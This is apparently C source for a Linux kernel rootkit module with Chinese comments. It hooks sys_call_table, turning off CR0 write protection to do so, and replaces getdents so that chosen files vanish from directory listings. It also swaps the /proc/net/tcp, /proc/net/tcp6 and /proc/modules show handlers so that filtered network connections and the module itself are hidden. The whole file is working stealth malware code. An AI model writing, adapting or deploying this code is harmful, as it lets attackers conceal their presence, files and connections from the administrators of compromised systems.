#include <linux/module.h>  /* Needed by all kernel modules */
#include <linux/kernel.h>  /* Needed for loglevels (KERN_WARNING, KERN_EMERG, KERN_INFO, etc.) */
#include <linux/init.h>    /* Needed for __init and __exit macros. */
#include <linux/moduleparam.h>
#include <linux/unistd.h>  /* sys_call_table __NR_* system call function indices */
#include <linux/fs.h>      /* filp_open */
#include <linux/slab.h>    /* kmalloc */

#include <asm/paravirt.h> /* write_cr0 */
#include <asm/uaccess.h>  /* get_fs, set_fs */
#include <linux/utsname.h>
#include <asm/cacheflush.h>
#include <linux/semaphore.h>
#include <linux/kallsyms.h>

#include <linux/file.h>
#include <linux/net.h>
#include <net/inet_sock.h>
#include <linux/byteorder/generic.h>
#include <linux/netfilter.h>
#include <linux/vmalloc.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <net/udp.h>
#include <linux/ktime.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/workqueue.h>
#include <linux/dirent.h>
#include <net/tcp.h>

#include "monitor_proc.h"

extern unsigned long my_kallsyms_lookup_name(const char *name);

struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char        d_name[1];
};

asmlinkage long (*read_syscall)(unsigned int fd, char __user *buf, size_t count);
asmlinkage long (*lseek_syscall)(unsigned int fd, off_t offset,
			  unsigned int whence);
asmlinkage long (*getdents_syscall)(unsigned int fd, 
        struct linux_dirent __user *dirent, unsigned int count);

int (*real_seq_show)(struct seq_file *seq, void *v);
int (*real_seq6_show)(struct seq_file *seq, void *v);
int (*real_module_seq_show)(struct seq_file *seq, void *v);


atomic_t read_cnt;
atomic_t getdents_cnt;

extern char *module_name;


#define PROC_NET_TCP    "tcp"
#define PROC_NET_TCP6   "tcp6" 
#define FULL_TCP_PATH "/proc/net/tcp"

#define MAX_FILTER 16
#define TMPSZ 150
#define MAX_LINE_NUM    256
static char filter_array[MAX_FILTER][MAX_LINE_NUM];

#define PROC_PATH "/proc"

#define MAX_PATH_LEN 256
#define MAX_NAME_LEN 32
#define MAX_HIDE_FILE 16
#define NEEDLE_LEN 6

#define NET_ENTRY "/proc/net/tcp"
#define NET6_ENTRY "/proc/net/tcp6"
#define PROC_MODULE_PATH "/proc/modules"


#define SEQ_AFINFO_STRUCT struct tcp_seq_afinfo


# define set_afinfo_seq_op(op, path, afinfo_struct, new, old)   \
    do {                                                        \
        struct file *filp;                                      \
        afinfo_struct *afinfo;                                  \
                                                                \
        filp = filp_open(path, O_RDONLY, 0);                    \
        if (IS_ERR(filp)) {                                     \
            MY_PRINT("Failed to open %s with error %ld.\n",     \
                     path, PTR_ERR(filp));                      \
            old = NULL;                                         \
        }                                                       \
                                                                \
        afinfo = PDE(filp->f_path.dentry->d_inode)->data;       \
        old = afinfo->seq_ops.op;                               \
        MY_PRINT("Setting seq_op->" #op " from %p to %p.",      \
                 old, new);                                     \
        afinfo->seq_ops.op = new;                               \
                                                                \
        filp_close(filp, 0);                                    \
    } while (0)


# define set_file_seq_op(opname, path, new, old)                    \
            do {                                                            \
                struct file *filp;                                          \
                struct seq_file *seq;                                       \
                struct seq_operations *seq_op;                              \
                                                                            \
                MY_PRINT("Opening the path: %s.\n", path);                  \
                filp = filp_open(path, O_RDONLY, 0);                        \
                if (IS_ERR(filp)) {                                         \
                    MY_PRINT("Failed to open %s with error %ld.\n",         \
                             path, PTR_ERR(filp));                          \
                    old = NULL;                                             \
                } else {                                                    \
                    MY_PRINT("Succeeded in opening: %s\n", path);           \
                    seq = (struct seq_file *)filp->private_data;            \
                    seq_op = (struct seq_operations *)seq->op;              \
                    old = seq_op->opname;                                   \
                                                                            \
                    MY_PRINT("Changing seq_op->"#opname" from %p to %p.\n", \
                             old, new);                                     \
                    disable_write_protection();                             \
                    seq_op->opname = new;                                   \
                    enable_write_protection();                              \
                }                                                           \
            } while (0)


atomic_t hide_info_flag;

struct hiden_path {
    char parent[MAX_PATH_LEN];
    char dname[MAX_NAME_LEN];
};
static struct hiden_path hiden_file_arr[MAX_HIDE_FILE];
spinlock_t hiden_file_arr_lock;

extern char *get_base_filename(char *fullpath);

void init_hiden_path_arr(void)
{
    spin_lock_init(&hiden_file_arr_lock);
    memset(hiden_file_arr, 0, sizeof(hiden_file_arr));
}

int add_hiden_full_path(char *fullpath)
{
    int i = 0;
    int ret = 0;
    char *base_name = get_base_filename(fullpath);
    
    spin_lock_bh(&hiden_file_arr_lock);
    for (i = 0; i < MAX_HIDE_FILE; i++) {
        if ((strlen(hiden_file_arr[i].dname) == 0)
            && (strlen(hiden_file_arr[i].parent) == 0)) {
            strncpy(hiden_file_arr[i].parent, fullpath, strlen(fullpath) - strlen(base_name) - 1);
            strncpy(hiden_file_arr[i].dname, base_name, MAX_NAME_LEN - 1);
            ret = 1;
            break;
        }
    }
    spin_unlock_bh(&hiden_file_arr_lock);

    return ret;
}

int add_hiden_path(char *parent, char *name)
{
    int ret = 0;
    int i = 0;

    spin_lock_bh(&hiden_file_arr_lock);
    for (i = 0; i < MAX_HIDE_FILE; i++) {
        if ((strlen(hiden_file_arr[i].dname) == 0)
            && (strlen(hiden_file_arr[i].parent) == 0)) {
            strncpy(hiden_file_arr[i].parent, parent, MAX_PATH_LEN - 1);
            strncpy(hiden_file_arr[i].dname, name, MAX_NAME_LEN - 1);
            ret = 1;
            break;
        }
    }
    spin_unlock_bh(&hiden_file_arr_lock);

    return ret;
}

void clear_hiden_path(char *parent, char *name)
{
    int i = 0;

    spin_lock_bh(&hiden_file_arr_lock);
    for (i = 0; i < MAX_HIDE_FILE; i++) {
        if ((strncmp(hiden_file_arr[i].parent, parent, MAX_PATH_LEN - 1) == 0)
            && (strncmp(hiden_file_arr[i].dname, name, MAX_NAME_LEN - 1) == 0)) {
            memset(hiden_file_arr[i].parent, 0, sizeof(hiden_file_arr[i].parent));
            memset(hiden_file_arr[i].dname, 0, sizeof(hiden_file_arr[i].dname));
            break;
        }
    }
    spin_unlock_bh(&hiden_file_arr_lock);
}

static int check_need_hiden_path(char *parent, char *name)
{
    int i = 0;
    int ret = 0;
    
    spin_lock_bh(&hiden_file_arr_lock);
    for (i = 0; i < MAX_HIDE_FILE; i++) {
        if ((strncmp(hiden_file_arr[i].parent, parent, MAX_PATH_LEN - 1) == 0)
            && (strncmp(hiden_file_arr[i].dname, name, MAX_NAME_LEN - 1) == 0)) {
            ret = 1;
            break;
        }
    }
    spin_unlock_bh(&hiden_file_arr_lock);

    return ret;
}

void disable_write_protection(void)
{
  unsigned long cr0 = read_cr0();
  clear_bit(16, &cr0);
  write_cr0(cr0);
}

void enable_write_protection(void)
{
  unsigned long cr0 = read_cr0();
  set_bit(16, &cr0);
  write_cr0(cr0);
}

int get_name_by_fd(int fd, char *buf, int buflen)
{
	char *tmp = (char*)__get_free_page(GFP_TEMPORARY);
	char *path = NULL;
	int ret = -1;
	struct file *file = fget(fd);
	int len = 0;

	if (!tmp) {
		MY_PRINT("Memory error!\n");
		return -ENOMEM;
	}
	
	if (file != NULL) {
		path = d_path(&file->f_path, tmp, PAGE_SIZE);
		if (IS_ERR(path)) {
			ret = -1;
			MY_PRINT("do_path error!\n");
			goto RET;
		}
		len = tmp + PAGE_SIZE - 1 - path;
		if (len > buflen) {
			len = buflen;
		}
		memset(buf, 0, buflen);
		memcpy(buf, path, len);
		buf[buflen - 1] = '\0';
		ret = 0;
	}

RET:
	if (file != NULL) {
		fput(file);
	}
	free_page((unsigned long)tmp);
	return ret;
}

static int _read_line(int fd, char *buf, size_t count) {
    int pos = 0;
    while (1) {
        char c = 0;
        int ret = read_syscall(fd, &c, 1); 
        if (ret <= 0) {
            return ret; 
        }   
        buf[pos] = c;
        pos++;
        if (c == '\n') {
            break; 
        }   
    }   

    return pos;
}

int hide_info_add_filter(char *filter)
{
    int i = 0;
    int ret = 0;
    
    for (i = 0; i < MAX_FILTER; i++) {
        if (strlen(filter_array[i]) != 0) {
            continue;
        }
        strncpy(filter_array[i], filter, sizeof(filter_array[i]) - 1);
        ret = 1;
        break;
    }

    for (i = 0; i < MAX_FILTER; i++) {
        if (strlen(filter_array[i]) == 0) {
            continue;
        }
        MY_PRINT("Filter line: %s\n", filter_array[i]);
    }

    return ret;
}

static int check_line_filter(char *line, size_t len)
{
    int i = 0;

    for (i = 0; i < MAX_FILTER; i++) {
        //MY_PRINT("11 line: %s\n", line);
        if (strlen(filter_array[i]) == 0) {
            continue;
        }
        //MY_PRINT("line: %s\n", line);
        //MY_PRINT("filter: %s\n", filter_array[i]);
        if (strnstr(line, filter_array[i], len) != NULL) {
            return 1;
        }
    }
    return 0;
}

int fake_tcp_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    size_t last_count, last_size;

    
    MY_PRINT("fake_seq_show\n");

    // 保存一份 ``count`` 值，
    // 下面的 ``real_seq_show`` 会往缓冲区里填充一条记录，
    // 添加完成后，seq->count 也会增加。
    last_count = seq->count;
    ret =  real_seq_show(seq, v);
    if (atomic_read(&hide_info_flag) == 0) {
        return ret;
    }

    // 填充记录之后的 count 减去填充之前的 count
    // 就可以得到填充的这条记录的大小了。
    last_size = seq->count - last_count;

    if (check_line_filter(seq->buf + seq->count - last_size, last_size)) {
        // 是需要隐藏的模块，
        // 把缓冲区已经使用的量减去这条记录的长度，
        // 也就相当于把这条记录去掉了。
        seq->count -= last_size;
    }

    return ret;
}

int fake_tcp6_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    size_t last_count, last_size;

    
    MY_PRINT("fake_seq_show\n");

    // 保存一份 ``count`` 值，
    // 下面的 ``real_seq_show`` 会往缓冲区里填充一条记录，
    // 添加完成后，seq->count 也会增加。
    last_count = seq->count;
    ret =  real_seq6_show(seq, v);
    if (atomic_read(&hide_info_flag) == 0) {
        return ret;
    }

    // 填充记录之后的 count 减去填充之前的 count
    // 就可以得到填充的这条记录的大小了。
    last_size = seq->count - last_count;

    if (check_line_filter(seq->buf + seq->count - last_size, last_size)) {
        // 是需要隐藏的模块，
        // 把缓冲区已经使用的量减去这条记录的长度，
        // 也就相当于把这条记录去掉了。
        seq->count -= last_size;
    }

    return ret;
}


int fake_module_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    size_t last_count, last_size;

    // 保存一份 ``count`` 值，
    // 下面的 ``real_seq_show`` 会往缓冲区里填充一条记录，
    // 添加完成后，seq->count 也会增加。
    last_count = seq->count;
    ret =  real_module_seq_show(seq, v);
    
    if (atomic_read(&hide_info_flag) == 0) {
        return ret;
    }

    // 填充记录之后的 count 减去填充之前的 count
    // 就可以得到填充的这条记录的大小了。
    last_size = seq->count - last_count;

    if (strnstr(seq->buf + seq->count - last_size, module_name,
                last_size)) {
        // 是需要隐藏的模块，
        // 把缓冲区已经使用的量减去这条记录的长度，
        // 也就相当于把这条记录去掉了。
        MY_PRINT("Hiding module: %s\n", module_name);
        seq->count -= last_size;
    }

    return ret;
}


long hide_proc_tcp_read(unsigned int fd, char __user *buf, size_t count)
{
    char tmp_buf[MAX_LINE_NUM] = {0};
    size_t read_size = 0;
    int ret = 0;

    while (read_size < count) {
        ret = _read_line(fd, tmp_buf, sizeof(tmp_buf));
        if (ret <= 0) {
            if (read_size == 0) {
                read_size = ret;
            }
            goto RET;
        }
        if (check_line_filter(tmp_buf, ret)) {
            continue;
        }

        if (ret <= count - read_size) {
            if (copy_to_user(buf + read_size, tmp_buf, ret)) {
                read_size = -EINVAL;
                goto RET;
            }
            read_size += ret;
        } else {
            if (read_size > 0) {
                lseek_syscall(fd, -ret, SEEK_CUR);
                goto RET;
            }
            if (copy_to_user(buf + read_size, tmp_buf, count)) {
                read_size = -EINVAL;
                goto RET;
            }
            lseek_syscall(fd, count - ret, SEEK_CUR);
            read_size = count;
            break;
        }
    }

RET:
    return read_size;
}

asmlinkage long fake_read(unsigned int fd, char __user *buf, size_t count)
{
    struct file *file = fget(fd);
    long ret = 0;
    char full_path[32] = {0};    
    mm_segment_t fs;
    
    atomic_inc(&read_cnt);
    
    fs = get_fs();
    set_fs(KERNEL_DS);

    if (atomic_read(&hide_info_flag) == 0) {
        ret = read_syscall(fd, buf, count);
        goto RET;
    }
    
    if (file == NULL) {
        ret = read_syscall(fd, buf, count);
        goto RET;
    }
    
    //MY_PRINT("file name: %s\n", file->f_dentry->d_name.name);
    if (strcmp(file->f_dentry->d_name.name, PROC_NET_TCP) != 0
        && strcmp(file->f_dentry->d_name.name, PROC_NET_TCP6) != 0) {
        ret = read_syscall(fd, buf, count);
        goto RET;
    }
    //MY_PRINT("FILE name is same ,need check full path.\n");
    if (get_name_by_fd(fd, full_path, sizeof(full_path)) != 0) {
        ret = read_syscall(fd, buf, count);
        goto RET;
    }
    //MY_PRINT("Get full path: %s\n", full_path);
    if (strstr(full_path, "/proc") == NULL || strstr(full_path, "/net/tcp") == NULL) {
        ret = read_syscall(fd, buf, count);
        goto RET;
    }
    //MY_PRINT("It's /proc/net/tcp need replace.\n");
    ret = hide_proc_tcp_read(fd, buf, count);
RET:
    if (file != NULL) {
        fput(file);
    }
    set_fs(fs);
    
    atomic_dec(&read_cnt);
    return ret;
}

asmlinkage long fake_getdents(unsigned int fd,
        struct linux_dirent __user *dirent, unsigned int count)
{
    char buf[256] = {0};
    mm_segment_t fs;
    int ret = 0;
    unsigned long off = 0;
    struct linux_dirent *kdirent = NULL;
    struct linux_dirent *dir = NULL;
    void *dpos = dirent;

    atomic_inc(&getdents_cnt);
    
    fs = get_fs();
    set_fs(KERNEL_DS);

    ret = getdents_syscall(fd, dirent, count);
    MY_PRINT("getdents ret: %d\n", ret);

    if (atomic_read(&hide_info_flag) == 0) {
        goto RET;
    }
    
    if (get_name_by_fd(fd, buf, sizeof(buf)) != 0) {
        goto RET;
    }
    //MY_PRINT("name: %s\n", buf);
    
    kdirent = kmalloc(ret, GFP_KERNEL);
    if (kdirent == NULL) {
        MY_PRINT("Malloc error!\n");
        goto RET;
    }
    if (copy_from_user(kdirent, dirent, ret)) {
        MY_PRINT("copy user error!\n");
        goto RET;
    }    
    
    while (off < ret) {
        dir = (void *)kdirent + off;
        //MY_PRINT("d_name: %s\n", dir->d_name);
        if (!check_need_hiden_path(buf, dir->d_name)) {
            if (copy_to_user(dpos, dir, dir->d_reclen)) {
                goto RET;
            }
            dpos += dir->d_reclen;
        }
        off += dir->d_reclen;
    }

    ret = dpos - (void*)dirent;
RET:
    set_fs(fs);
    if (kdirent != NULL) {
        kfree(kdirent);
    }
    
    atomic_dec(&getdents_cnt);
    return ret;
}

int init_hide_info(void)
{
    int ret = -1;
    void **sys_table = NULL;

    atomic_set(&hide_info_flag, 1);

    init_hiden_path_arr();
    
    sys_table = (void **)my_kallsyms_lookup_name("sys_call_table");
    read_syscall = NULL;
    lseek_syscall = NULL;
    if (sys_table != NULL) {
        read_syscall = sys_table[__NR_read];
        lseek_syscall = sys_table[__NR_lseek];
        getdents_syscall = sys_table[__NR_getdents];

        disable_write_protection();
        //sys_table[__NR_read] = (void *)&fake_read;
        sys_table[__NR_getdents] = (void *)&fake_getdents;
        enable_write_protection();
        
        atomic_set(&read_cnt, 0);
        ret = 0;
    }
    
    set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT,
                      fake_tcp_seq_show, real_seq_show);
    set_afinfo_seq_op(show, NET6_ENTRY, SEQ_AFINFO_STRUCT,
                      fake_tcp6_seq_show, real_seq6_show);
    set_file_seq_op(show, PROC_MODULE_PATH, 
        fake_module_seq_show, real_module_seq_show);
    
    memset(filter_array, 0, sizeof(filter_array));

    return ret;
}

void clear_hide_info(void)
{    
    void *dummy = NULL;
    void **sys_table = (void **)my_kallsyms_lookup_name("sys_call_table");
    if (sys_table != NULL) {
        disable_write_protection();
        //sys_table[__NR_read] = (void *)read_syscall;
        sys_table[__NR_getdents] = (void *)getdents_syscall;
        enable_write_protection();

        while (atomic_read(&read_cnt) != 0 || atomic_read(&getdents_cnt) != 0) {
            printk(KERN_INFO "Need read caller num: %d, not zero, wait 1s.\n", atomic_read(&read_cnt));
            printk(KERN_INFO "Need getdents caller num: %d, not zero, wait 1s.\n", atomic_read(&getdents_cnt));
            msleep(1000);
        }
    }
    
    if (real_seq_show) {
        set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT,
                          real_seq_show, dummy);
    }

    if (real_seq6_show) {
        set_afinfo_seq_op(show, NET6_ENTRY, SEQ_AFINFO_STRUCT,
                          real_seq6_show, dummy);
    }
    if (real_module_seq_show) {
        set_file_seq_op(show, PROC_MODULE_PATH, real_module_seq_show, dummy);
    }
    memset(filter_array, 0, sizeof(filter_array));
}

